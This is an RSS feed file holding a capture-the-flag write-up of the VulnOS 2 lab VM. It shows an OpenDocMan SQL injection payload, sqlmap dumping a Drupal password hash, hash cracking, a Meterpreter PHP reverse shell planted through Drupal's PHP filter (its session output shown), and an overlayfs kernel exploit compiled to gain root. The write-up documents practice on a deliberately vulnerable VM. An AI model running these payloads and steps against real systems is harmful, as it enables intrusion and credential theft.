@@ -1,0 +1,450 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Vulnos on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/vulnos/</link>
+    <description>Recent content in Vulnos on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 09 Sep 2016 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://rastamouse.me/tags/vulnos/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>VulnOS: 2</title>
+      <link>https://rastamouse.me/writeups/2016/vulnos-2/</link>
+      <pubDate>Fri, 09 Sep 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://rastamouse.me/writeups/2016/vulnos-2/</guid>
+      <description>
+
+&lt;p&gt;Your assignment is to pentest a company website, get root of the system and read the final flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -n -A -p- 192.168.56.104
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
+|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
+|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: VulnOSv2
+6667/tcp open  irc     ngircd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We&amp;rsquo;ll check out port 80 first.&lt;/p&gt;
+
+&lt;h2 id=&#34;drupal:39268561588adc281b818541b0b30b2a&#34;&gt;Drupal&lt;/h2&gt;
+
+&lt;p&gt;We follow the initial link to &lt;code&gt;/jabc&lt;/code&gt; with a Drupal installation (given away by the favicon and bits of meta data such as &lt;code&gt;&amp;lt;meta name=&amp;quot;Generator&amp;quot; content=&amp;quot;Drupal 7 (http://drupal.org)&amp;quot; /&amp;gt;&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;https://rastamouse.me/img/writeups/vulnos-2/jabc.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can get to the login panel at &lt;code&gt;/jabc/?q=user&lt;/code&gt; but I didn&amp;rsquo;t find any daft &lt;code&gt;admin:admin&lt;/code&gt; type credentials that worked.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;https://rastamouse.me/img/writeups/vulnos-2/jabc-login.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Initially, on the &lt;code&gt;Documentation&lt;/code&gt; page, there doesn&amp;rsquo;t appear to be any content.  But if you look at the source or so a Select-All to highlight the page, some black-on-black text becomes visible.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;https://rastamouse.me/img/writeups/vulnos-2/jabc-doc.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;At &lt;code&gt;/jabcd0cs&lt;/code&gt; is an installation of OpenDocMan.  You can login with &lt;code&gt;guest:guest&lt;/code&gt; and it sends you down a rabbit role, which ultimately I could not exploit.  You can upload PHP files, but the mime-type appears disabled on the web server so it doesn&amp;rsquo;t grant you code execution.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;https://rastamouse.me/img/writeups/vulnos-2/opendocman.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&#34;sqli:39268561588adc281b818541b0b30b2a&#34;&gt;SQLi&lt;/h2&gt;
+
+&lt;p&gt;I looked up OpenDocMan 1.2.7 in exploitdb to see if there was anything I could take advantage of.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;OpenDocMan 1.2.7 - Multiple Vulnerabilities			| ./php/webapps/32075.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# less /usr/share/exploitdb/platforms/php/webapps/32075.txt 
+
+1) SQL Injection in OpenDocMan: CVE-2014-1945
+
+The vulnerability exists due to insufficient validation of &amp;quot;add_value&amp;quot; HTTP GET parameter in &amp;quot;/ajax_udf.php&amp;quot; script. A remote unauthenticated attacker can execute arbitrary SQL commands in application&#39;s database.
+The exploitation example below displays version of the MySQL server:
+
+http://[host]/ajax_udf.php?q=1&amp;amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you try it quickly using &lt;code&gt;cURL&lt;/code&gt;, you can see there&amp;rsquo;s a positive result in part of the HTML.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# curl &amp;quot;http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9&amp;quot;
+
+5.5.47-0ubuntu0.14.04.1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now we can throw it across to &lt;code&gt;sqlmap&lt;/code&gt; to leverage this with more ease.&lt;/p&gt;
+
+&lt;p&gt;The injection is within the &lt;code&gt;add_value&lt;/code&gt; parameter, but note that you require &lt;code&gt;odm_user&lt;/code&gt; as part of it.  The injection point is after this string (i.e. &lt;code&gt;odm_user *&lt;/code&gt;).  Since we know it&amp;rsquo;s &lt;code&gt;UNION query-based&lt;/code&gt;, we can specify this on the command line, just to speed things up a bit.  You don&amp;rsquo;t have to do this, &lt;code&gt;sqlmap&lt;/code&gt; will find it regardless.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -u &amp;quot;http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;amp;add_value=odm_user&amp;quot; -p add_value --technique=U
+
+---
+Parameter: add_value (GET)
+    Type: UNION query
+    Title: MySQL UNION query (90) - 9 columns
+    Payload: q=1&amp;amp;add_value=odm_user UNION ALL SELECT 90,CONCAT(0x7171707171,0x5a5a4549566c68564770435463486e4b506b464c746558705455556e73456a47584a6e4f55655542,0x7162717a71),90,90,90,90,90,90,90#
+---
+[20:33:39] [INFO] testing MySQL
+[20:33:39] [INFO] confirming MySQL
+[20:33:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL &amp;gt;= 5.0.0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My aim was to grab a username &amp;amp; password (or hash) from the Drupal DB.  If I can gain some sort of admin access to the CMS, I may be able to upload a PHP backdoor to get a shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;available databases [6]:
+[*] drupal7
+[*] information_schema
+[*] jabcd0cs
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+
+
+Database: drupal7
+[140 tables]
++------------------------------------------+
+| actions                                  |
+| aggregator_category                      |
+| aggregator_category_feed                 |
+| aggregator_category_item                 |
+| aggregator_feed                          |
+| aggregator_item                          |
+| authmap                                  |
+| batch                                    |
+| block                                    |
+| block_custom                             |
+| block_node_type                          |
+| block_role                               |
+| blocked_ips                              |
+| book                                     |
+| cache                                    |
+| cache_block                              |
+| cache_bootstrap                          |
+| cache_field                              |
+| cache_filter                             |
+| cache_form                               |
+| cache_image                              |
+| cache_menu                               |
+| cache_page                               |
+| cache_path                               |
+| cache_rules                              |
+| cache_token                              |
+| cache_update                             |
+| cache_views                              |
+| cache_views_data                         |
+| ckeditor_input_format                    |
+| ckeditor_settings                        |
+| comment                                  |
+| commerce_calculated_price                |
+| commerce_checkout_pane                   |
+| commerce_customer_profile                |
+| commerce_customer_profile_revision       |
+| commerce_line_item                       |
+| commerce_order                           |
+| commerce_order_revision                  |
+| commerce_payment_transaction             |
+| commerce_payment_transaction_revision    |
+| commerce_product                         |
+| commerce_product_revision                |
+| commerce_product_type                    |
+| contact                                  |
+| ctools_access_ruleset                    |
+| ctools_css_cache                         |
+| ctools_custom_content                    |
+| ctools_object_cache                      |
+| date_format_locale                       |
+| date_format_type                         |
+| date_formats                             |
+| field_config                             |
+| field_config_instance                    |
+| field_data_body                          |
+| field_data_comment_body                  |
+| field_data_commerce_customer_address     |
+| field_data_commerce_customer_billing     |
+| field_data_commerce_display_path         |
+| field_data_commerce_line_items           |
+| field_data_commerce_order_total          |
+| field_data_commerce_price                |
+| field_data_commerce_product              |
+| field_data_commerce_total                |
+| field_data_commerce_unit_price           |
+| field_data_field_description             |
+| field_data_field_image                   |
+| field_data_field_product                 |
+| field_data_field_tags                    |
+| field_revision_body                      |
+| field_revision_comment_body              |
+| field_revision_commerce_customer_address |
+| field_revision_commerce_customer_billing |
+| field_revision_commerce_display_path     |
+| field_revision_commerce_line_items       |
+| field_revision_commerce_order_total      |
+| field_revision_commerce_price            |
+| field_revision_commerce_product          |
+| field_revision_commerce_total            |
+| field_revision_commerce_unit_price       |
+| field_revision_field_description         |
+| field_revision_field_image               |
+| field_revision_field_product             |
+| field_revision_field_tags                |
+| file_managed                             |
+| file_usage                               |
+| filter                                   |
+| filter_format                            |
+| flood                                    |
+| history                                  |
+| image_effects                            |
+| image_styles                             |
+| menu_custom                              |
+| menu_links                               |
+| menu_router                              |
+| node                                     |
+| node_access                              |
+| node_comment_statistics                  |
+| node_revision                            |
+| node_type                                |
+| page_manager_handlers                    |
+| page_manager_pages                       |
+| page_manager_weights                     |
+| queue                                    |
+| rdf_mapping                              |
+| registry                                 |
+| registry_file                            |
+| role                                     |
+| role_permission                          |
+| rules_config                             |
+| rules_dependencies                       |
+| rules_scheduler                          |
+| rules_tags                               |
+| rules_trigger                            |
+| search_dataset                           |
+| search_index                             |
+| search_node_links                        |
+| search_total                             |
+| semaphore                                |
+| sequences                                |
+| sessions                                 |
+| shortcut_set                             |
+| shortcut_set_users                       |
+| simpletest                               |
+| simpletest_test_id                       |
+| stylizer                                 |
+| system                                   |
+| taxonomy_index                           |
+| taxonomy_term_data                       |
+| taxonomy_term_hierarchy                  |
+| taxonomy_vocabulary                      |
+| tracker_node                             |
+| tracker_user                             |
+| url_alias                                |
+| users                                    |
+| users_roles                              |
+| variable                                 |
+| views_display                            |
+| views_view                               |
+| watchdog                                 |
++------------------------------------------+
+
+
+Database: drupal7
+Table: users
+[16 columns]
++------------------+------------------+
+| Column           | Type             |
++------------------+------------------+
+| language         | varchar(12)      |
+| access           | int(11)          |
+| created          | int(11)          |
+| data             | longblob         |
+| init             | varchar(254)     |
+| login            | int(11)          |
+| mail             | varchar(254)     |
+| name             | varchar(60)      |
+| pass             | varchar(128)     |
+| picture          | int(11)          |
+| signature        | varchar(255)     |
+| signature_format | varchar(255)     |
+| status           | tinyint(4)       |
+| theme            | varchar(255)     |
+| timezone         | varchar(32)      |
+| uid              | int(10) unsigned |
++------------------+------------------+
+
+
+Database: drupal7
+Table: users
+[2 entries]
++---------+---------------------------------------------------------+
+| name    | pass                                                    |
++---------+---------------------------------------------------------+
+| &amp;lt;blank&amp;gt; | &amp;lt;blank&amp;gt;                                                 |
+| webmin  | $S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug |
++---------+---------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;webmin1980:39268561588adc281b818541b0b30b2a&#34;&gt;webmin1980&lt;/h2&gt;
+
+&lt;p&gt;I tried running this hash through &lt;code&gt;hashcat&lt;/code&gt;, with the brute force mode.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;hashcat64.exe -a 3 -m 7900 C:\Users\rasta\Desktop\drupal.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I went and walked the dogs at this point - when I got back it was just finishing the 9 character space.  10 would take another hour or so, which I wasn&amp;rsquo;t prepared to wait for.  Before moving on to look at any of the other databases, I thought I&amp;rsquo;d try my luck basing the password off the username:  &lt;code&gt;webmin&lt;/code&gt;.  This with some mangling rules got me the password pretty quickly.  Though because the wordlist is so small, you&amp;rsquo;re better off switching to something that&amp;rsquo;s CPU based rather than GPU.  So I used &lt;code&gt;JTR&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# john drupal --wordlist=word --rules=all
+
+Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+webmin1980       (webmin)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;php-shell:39268561588adc281b818541b0b30b2a&#34;&gt;PHP Shell&lt;/h2&gt;
+
+&lt;p&gt;So now that I can log in as a Drupal admin, I can start poking around the backend (uh er).  If you explore the &lt;code&gt;Modules&lt;/code&gt; section, there&amp;rsquo;s one called &lt;code&gt;PHP filter&lt;/code&gt; which is currently unchecked.  It&amp;rsquo;s description is rather attractive:
+&lt;code&gt;Allows embedded PHP code/snippets to be evaluated.&lt;/code&gt;&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;https://rastamouse.me/img/writeups/vulnos-2/modules.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Enable the module and &lt;code&gt;Save configuration&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now go to &lt;code&gt;Content&lt;/code&gt; &amp;gt; &lt;code&gt;Add content&lt;/code&gt;.  I think you can choose any type, I did &lt;code&gt;Article&lt;/code&gt;.  Give it a &lt;code&gt;Title&lt;/code&gt; and add your PHP code into the &lt;code&gt;Body&lt;/code&gt; section (I used some Meterpreter PHP Reverse shell goodness).  Finally, select &lt;code&gt;PHP code&lt;/code&gt; from the &lt;code&gt;Text format&lt;/code&gt; drop down.&lt;/p&gt;
+
+&lt;p&gt;It should look something like this:&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;https://rastamouse.me/img/writeups/vulnos-2/meterp-code.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Set up your handler and you can simply click &lt;code&gt;Preview&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] Started reverse TCP handler on 192.168.56.101:4444 
+[*] Starting the payload handler...
+[*] Sending stage (33721 bytes) to 192.168.56.104
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.104:41696) at 2016-09-09 22:03:29 +0100
+
+meterpreter &amp;gt; sysinfo 
+Computer    : VulnOSv2
+OS          : Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686
+Meterpreter : php/linux
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;priv-esc:39268561588adc281b818541b0b30b2a&#34;&gt;Priv Esc&lt;/h2&gt;
+
+&lt;p&gt;This turned out to be a rather simple task.  We can already see the kernel version: &lt;code&gt;3.13.0&lt;/code&gt;, and we know it&amp;rsquo;s Ubuntu.  We can quickly drop into a shell and find exactly which version:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Distributor ID:	Ubuntu
+Description:	Ubuntu 14.04.4 LTS
+Release:	14.04
+Codename:	trusty
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another quick search of exploitdb and we have a possible candidate.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overlayfs&#39; Local Root Shell			| ./linux/local/37292.c
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;gcc&lt;/code&gt; is installed, so we can upload and compile on the target without any fuss.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; pwd
+/tmp
+
+meterpreter &amp;gt; upload /usr/share/exploitdb/platforms/linux/local/37292.c x.c
+[*] uploading  : /usr/share/exploitdb/platforms/linux/local/37292.c -&amp;gt; x.c
+[*] uploaded   : /usr/share/exploitdb/platforms/linux/local/37292.c -&amp;gt; x.c
+
+meterpreter &amp;gt; execute -f gcc -a x.c
+Process 2651 created.
+
+meterpreter &amp;gt; ls
+Listing: /tmp
+=============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100755/rwxr-xr-x  12189  fil   2016-09-08 20:27:48 +0100  a.out
+100644/rw-r--r--  5123   fil   2016-09-08 20:26:32 +0100  x.c
+
+
+meterpreter &amp;gt; shell
+
+./a.out
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can&#39;t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;# ls -l /root
+
+-rw-r--r-- 1 root root 165 May  4 19:06 flag.txt
+    
+# cat /root/flag.txt
+Hello and welcome.
+You successfully compromised the company &amp;quot;JABC&amp;quot; and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/@c4b3rw0lf&#34;&gt;c4b3rw0lf&lt;/a&gt; for taking the time to make this VM :)&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
